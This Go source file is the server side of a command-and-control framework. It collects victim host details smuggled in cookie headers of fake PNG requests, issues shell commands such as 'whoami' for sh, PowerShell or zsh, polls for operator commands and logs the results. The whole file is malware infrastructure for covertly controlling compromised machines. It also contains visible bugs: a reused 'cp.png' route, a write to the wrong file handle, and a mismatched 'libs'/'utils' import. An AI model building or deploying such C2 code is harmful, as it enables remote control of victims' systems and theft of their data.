package main

import (
	"encoding/json"
	"github.com/labstack/echo/v4"
	"io/ioutil"
	"libs"
	"net/http"
	"os"
	"path"
	"strings"
)

type hostInfoStruct struct {
	HostName string `json:"hostname"`
	Os       string `json:"os"`
	Platform string `json:"platform"`
}

func printRequest(debug bool, c echo.Context) {
	utils.PrintDebug(debug, "%s > Handling %s:%s", c.RealIP(), c.Request().Method, c.Request().RequestURI)
}

func handlerBasicGet(c echo.Context) error {
	printRequest(debug, c)
	return c.String(http.StatusOK, "ok")
}

func handlerStaticGet(c echo.Context) error {
	printRequest(debug, c)
	utils.PrintDebug(debug, "%s < 404 - Not Found", c.RealIP())
	return c.String(http.StatusNotFound, "404: not found")
}

func handleInfoUpload(c echo.Context) error {
	var (
		fileName string
		hostInfo hostInfoStruct
	)
	printRequest(debug, c)
	data := c.Request().Header.Get("cookie")
	guid := data[:strings.Index(data, "=")]
	data = data[strings.Index(data, "=")+1:]
	folderPath := hostsPath + "/" + guid
	imageName := path.Base(c.Request().URL.Path)
	decoded, err := utils.DecodeString(true, data)
	if err != nil {
		utils.PrintDebug(debug, "%s < error decoding data\n%v", c.RealIP(), err)
		return nil
	}

	switch {
	case imageName == "ho.png":
		fileName = "host_info.json"
		json.Unmarshal([]byte(decoded), &hostInfo)
		os.Mkdir(c2cmdPath+"/"+guid, 0755)

		var cmd2file string = c2cmdPath + "/" + guid
		var shellName string
		switch {
		case hostInfo.Os == "linux":
			shellName = "sh"
		case hostInfo.Os == "windows":
			shellName = "powershell"
		case hostInfo.Os == "darwin":
			shellName = "zsh"
		default:
			shellName = "unknown"
		}
		cmd2file = cmd2file + "/" + shellName
		os.OpenFile(cmd2file, os.O_RDONLY|os.O_CREATE, 0666)
	case imageName == "ni.png":
		fileName = "network_interfaces.json"
	case imageName == "hi.png":
		fileName = "hosts_ips.json"
	case imageName == "cp.png":
		fileName = "cpus.json"
	case imageName == "me.png":
		fileName = "memory.json"
	case imageName == "pa.png":
		fileName = "partitions.json"
	case imageName == "pu.png":
		fileName = "partitions_usage.json"
	default:
		fileName = "default.json"
	}

	os.Mkdir(folderPath, 0755)

	if _, err := os.Stat(folderPath + "/" + fileName); err == nil {
		os.Remove(folderPath + "/" + fileName)
	}
	f, err := os.Create(folderPath + "/" + fileName)
	if err != nil {
		utils.PrintDebug(debug, "%s < error creating file %s\n%v", c.RealIP(), fileName, err)
		return nil
	}
	defer f.Close()
	_, err = f.WriteString(decoded)
	if err != nil {
		utils.PrintDebug(debug, "%s < error writing to file %s\n%v", c.RealIP(), fileName, err)
		return nil
	}
	utils.PrintDebug(debug, "%s < info saved", c.RealIP())
	return nil
}

func handleC2Cmd(c echo.Context) error {
	var (
		decoded string
		err     error
	)
	printRequest(debug, c)

	data := c.Request().Header.Get("cookie")
	guid := data[:strings.Index(data, "=")]

	if len(data)-1 > strings.Index(data, "=") {
		data = data[strings.Index(data, "=")+1:]
		decoded, err = utils.DecodeString(true, data)
		if err != nil {
			utils.PrintDebug(debug, "%s < error decoding data\n%v", c.RealIP(), err)
			return nil
		}
		utils.PrintDebug(debug, "%s < data: %s", c.RealIP(), decoded)
	} else {
		data = ""
	}

	folderPath := hostsPath + "/" + guid
	imageName := path.Base(c.Request().URL.Path)

	var (
		cmd2file string = c2cmdPath + "/" + guid
		shellcmd string
		f        *os.File
	)

	switch {
	case imageName == "cm.png": // commands
		utils.PrintDebug(debug, "Get default shell commands")
		if _, err := os.Stat(cmd2file + "/sh"); err == nil {
			shellcmd = "sh:-c:whoami"
		} else if _, err = os.Stat(cmd2file + "/powershell"); err == nil {
			shellcmd = "powershell:whoami"
		} else if _, err = os.Stat(cmd2file + "/zsh"); err == nil {
			shellcmd = "zsh:-c:whoami"
		}
		f, err = os.OpenFile(cmd2file+"/console.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			utils.PrintDebug(debug, "Could not open file at: %s\n%v", cmd2file+"/console.log", err)
		} else {
			defer f.Close()
			if _, err := f.WriteString("\n> " + shellcmd + "\n"); err != nil {
				utils.PrintDebug(debug, "Could not write at %s\n%v", cmd2file+"/console.log", err)
			}
		}

		utils.PrintDebug(debug, "Sending command: %s", shellcmd)
		return c.String(http.StatusOK, shellcmd)
	case imageName == "cr.png": // response
		utils.PrintDebug(debug, "Storing response from command: %s", decoded)
		f, err = os.OpenFile(cmd2file+"/console.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			utils.PrintDebug(debug, "Could not open file at: %s\n%v", cmd2file+"/console.log", err)
		} else {
			defer f.Close()
			if _, err := f.WriteString("\n< " + decoded + "\n"); err != nil {
				utils.PrintDebug(debug, "Could not write at %s\n%v", cmd2file+"/console.log", err)
			}
		}

		return nil
	case imageName == "cp.png": // command polling
		utils.PrintDebug(debug, "Checking for new commands")
		if _, err := os.Stat(cmd2file + "/command"); err == nil {
			f, err := os.Open(cmd2file + "/command")
			if err == nil {
				defer f.Close()
				defer os.Remove(cmd2file + "/command")
				b, err := ioutil.ReadAll(f)
				ff, err2 := os.OpenFile(cmd2file+"/console.log",
					os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
				if err2 == nil {
					defer ff.Close()
					f.WriteString("\n< " + string(b) + "\n")
				}
				if err == nil {
					return c.String(http.StatusOK, string(b))
				}
			}
		}
		return c.String(http.StatusNotModified, "")
	}

	os.Mkdir(folderPath, 0755)
	return nil
}
